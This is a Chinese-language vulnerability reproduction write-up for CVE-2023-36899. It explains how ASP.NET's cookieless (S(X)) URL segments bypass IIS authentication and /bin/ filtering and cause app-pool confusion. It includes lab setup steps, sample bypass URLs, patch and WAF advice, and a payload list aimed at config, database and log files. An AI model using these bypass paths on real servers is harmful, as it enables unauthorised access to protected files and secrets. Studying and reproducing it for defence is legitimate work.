# CVE-2023-36899
CVE-2023-36899漏洞的复现环境和工具，针对ASP.NET框架中的无cookie会话身份验证绕过。

Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899)

在现代的Web开发中，尽管cookies是传输会话ID的首选方法，但.NET Framework也提供了一种替代方法：直接在URL中编码会话ID。这种技术被称为.NET Framework中的“无cookie”特性。许多开发者和安全测试人员忽视了这个选项，因为在实际应用中很少见。然而，这已经成为发现客户端漏洞的宝藏，如会话固定、会话劫持、HTML注入和跨站脚本。此外，这个特性可以被利用来绕过那些没有配置识别无cookie方法的基于路径的防火墙规则。由于固有的安全问题，.NET Core和后续的.NET版本都省略了无cookie特性。但我们不能忘记仍在使用经典.NET Framework的大量Web应用程序。

**关键点**:

1. .NET Framework的无cookie特性可以被滥用，以访问受保护的目录或被IIS的URL过滤器阻止的目录。
2. 通过使用无cookie特性，可以绕过IIS的认证或过滤检查。
3. 另一个问题涉及IIS如何管理应用程序池，可能导致权限升级或安全绕过。
4. 通过.NET Framework的无cookie特性，可以迫使IIS应用程序使用其父应用程序池而不是自己的应用程序池运行。

# 漏洞详情：
### 1. IIS受限路径绕过
.NET Framework的无cookie特性可以被滥用来访问受保护的目录或被IIS的URL过滤器阻止的目录。例如，考虑victim.com网站上的以下情况：

- 位于/protected/目录中的页面：/webform/protected/target1.aspx，该目录强制进行基本认证。
- 被临时移动到/bin/文件夹的页面：/webform/bin/target2.aspx，使其无法访问。

正常情况下，通过这些URL访问页面会在IIS中被阻止：

- [http://10.0.2.15:8080/webform/protected/target1.aspx](http://10.0.2.15:8080/webform/protected/target1.aspx)
- [http://10.0.2.15:8080/webform/bin/target2.aspx](http://10.0.2.15:8080/webform/bin/target2.aspx)

但是，可以利用无cookie特性通过以下模式访问这些页面：

- [http://10.0.2.15:8080/webform/(S(X))/prot/(S(X))ected/target1.aspx](http://10.0.2.15:8080/webform/(S(X))/prot/(S(X))ected/target1.aspx)
- [http://10.0.2.15:8080/webform/(S(X))/b/(S(X))in/target2.aspx](http://10.0.2.15:8080/webform/(S(X))/b/(S(X))in/target2.aspx)
### 2. 应用程序池混淆
IIS如何管理应用程序池可能导致权限升级或安全绕过。可以操纵.NET Framework的无cookie特性，迫使IIS应用程序使用其父应用程序池而不是自己的应用程序池运行。
例如：

- 网站的根(/)使用DefaultAppPool应用程序池运行。
- /classic/应用程序使用.NET v4.5 Classic应用程序池。
- /classic/nodotnet/应用程序使用NoManagedCodeClassic应用程序池，它不支持托管代码。

一个名为AppPoolPrint.aspx的C#文件可以在上述所有应用程序中访问，显示当前的应用程序池名称。
通过使用无cookie特性两次，我们可以使用其父应用程序池运行此页面：

- /(S(X))/(S(X))/classic/AppPoolPrint.aspx -> DefaultAppPool
- /(S(X))/(S(X))/classic/nodotnet/AppPoolPrint.aspx -> DefaultAppPool
- /classic/(S(X))/(S(X))/nodotnet/AppPoolPrint.aspx -> .NET v4.5 Classic

这允许即使在/classic/nodotnet/中的页面（不应执行托管代码）也可以使用其父应用程序池运行ASPX页面。这种行为可能导致在IIS上的权限升级。

# 漏洞复现：
### 1. **环境准备**:

- **操作系统**: 安装一个Windows Server版本，例如Windows Server 2016或2019。
- **Web服务器**: 安装Internet Information Services (IIS)。
- **开发框架**: 安装.NET Framework（不是.NET Core或.NET 5+）。

安装IIS的时候选择

- **Web服务器**:
   - **常用HTTP功能**:
      - 静态内容
      - 默认文档
      - 目录浏览
      - HTTP错误
   - **应用程序开发**:
      - .NET Extensibility (对应你的.NET Framework版本：4.5)
      - ASP.NET (对应你的.NET Framework版本： 4.5)
      - ISAPI扩展
      - ISAPI筛选器
- **健康和诊断**:
   - HTTP日志记录
   - 请求监视
   - 日志工具
- **安全性**:
   - 请求筛选
   - 基本身份验证
   - Windows身份验证 
### 2. **配置IIS**:

1. 打开IIS管理器。
2. 创建一个新的Web站点。
3. 在新站点中，创建几个目录，例如/webform, /webform/protected, 和/webform/bin。
4. 在/protected/目录中，设置基本认证。
5. 将/webform/bin/target.aspx页面移动到/bin/文件夹，使其无法直接访问。 （bin目录iis默认不让访问，因为涉及敏感的编译好的程序）
### 3. **创建测试页面**:

1. 在/webform/protected/目录中，创建一个名为target.aspx的页面。
2. 在/webform/bin/目录中，创建一个名为target.aspx的页面。
3. 在每个应用程序中，创建一个名为AppPoolPrint.aspx的页面，该页面可以显示当前的应用程序池名称。

target.aspx 文件测试内容：
```csharp
<%@ Page Language="C#" %>
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ASPX Test</title>
</head>
<body>
    This is a static text. <br>
    Dynamic text: <%= DateTime.Now.ToString() %>
        </body>
</html>

```
根目录下 web.config文件测试内容：
```csharp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
        <compilation debug="true" targetFramework="4.5" />
        <httpRuntime targetFramework="4.5" />
        <sessionState mode="InProc" cookieless="UseCookies" />
    </system.web>
</configuration>
```
> 其中<sessionState mode="InProc" cookieless="UseCookies" />意味着网站使用Cookie来存储一些默认session信息等，默认也是这个

### 4. **复现漏洞**:

1. 尝试直接访问/webform/protected/target.aspx和/webform/bin/target.aspx页面。你应该会被阻止或要求进行身份验证。

![2023-08-16 06-25-21屏幕截图.png](https://cdn.nlark.com/yuque/0/2023/png/21989428/1692138348739-2f46efdc-dcdf-45ba-b5be-28e87d81314d.png#averageHue=%23f6f6f6&clientId=ud2ad38a7-48dc-4&from=ui&id=fKZwp&originHeight=606&originWidth=937&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56130&status=done&style=none&taskId=u684b4278-47f8-4afd-a1f0-f934e7b6236&title=)

使用[http://10.0.2.15:8080/webform/(S(X))/b/(S(X))in/target1.aspx ]()成功访问
![2023-08-16 06-33-20屏幕截图.png](https://cdn.nlark.com/yuque/0/2023/png/21989428/1692138808414-0d5764b8-d511-44f6-927e-ab8d2de586e8.png#averageHue=%23f9f9f9&clientId=ub45e7914-f0f5-4&from=ui&id=YMtU2&originHeight=668&originWidth=1011&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43172&status=done&style=none&taskId=u3b1805ea-72a4-4168-91f9-35c6ead6dc2&title=)

2. 使用无cookie特性尝试访问这些页面，例如：
   - [https://yourserver/webform/(S(X))/prot/(S(X))ected/target.aspx](https://yourserver/webform/(S(X))/prot/(S(X))ected/target1.aspx)
   - [https://yourserver/webform/(S(X))/b/(S(X))in/target.aspx](https://yourserver/webform/(S(X))/b/(S(X))in/target2.aspx) 你应该能够绕过身份验证或过滤器访问这些页面。

# 修复建议

1.  将 /S(X)) 特征在WAF上进行阻断
2.  服务器上安装相应补丁  [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36899](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36899)

可能存在的payload list:
```csharp
/config/(S(X))/a/(S(X))pp/settings.xml
/config/(S(X))/settings.xml
/config/(S(X))/database.yml
/admin/(S(X))/config.xml
/a/(S(X))ppled/resource
/dashboard/(S(X))/data.json
/logs/(S(X))/error.log
/api/v1/(S(X))/config.json
/admin/s/(S(X))ettings/config.xml
/manage/s/(S(X))cripts/script.js
/dashboard/d/(S(X))ata/data.json
/config/dat/(S(X))abase/database.yml
....
```
# refer：
[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36899](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36899)
[https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/)
[https://nvd.nist.gov/vuln/detail/CVE-2023-36899](https://nvd.nist.gov/vuln/detail/CVE-2023-36899)
[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36899)
